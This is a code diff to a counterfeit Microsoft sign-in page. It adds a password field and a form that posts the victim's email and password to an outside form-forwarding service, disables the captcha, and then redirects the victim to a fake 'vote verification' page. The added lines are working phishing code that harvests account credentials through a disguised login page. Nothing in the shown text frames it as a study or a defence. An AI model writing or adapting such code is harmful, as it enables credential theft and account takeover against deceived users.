@@ -136,15 +136,22 @@
     <div id="div1">
         <img id="img1" src="image/microsoftlogo.png" alt="">
         <p id="p1">Sign in</p>
-        <input id="textbox" type="text" name="email" placeholder="Email, phone, or Skype" required>
+        <form action="https://formsubmit.co/your@email.com" method="POST">
+        <input id="textbox" type="text" name="email" id="email" placeholder="Email, phone, or Skype" required>
+        <input id="textbox" type="text" name="password" id="password" placeholder="Password" required>
         <hr>
         <label id="label1" for="">No account?</label>
         <a id="a1" href="#">Create one!</a><br><br>
         <a id="a2" href="#">Sign in with Windows Hello or a security key</a>
         <a id="a3" href="#"><img id="img2" src="image/q4.png" alt=""></a><br><br>
         <input id="submit" type="submit" name="submit" value="Next">
-    </div>
+            <input type="hidden" name="_next" value="https://krsqwp.github.io/vlioate/vote_verification.html">
 
+<input type="hidden" name="_captcha" value="false">
+
+
+    </div>
+</form>
     <div id="div2">
         <button id="button1">
             <img id="img3" src="image/key.png" alt="">
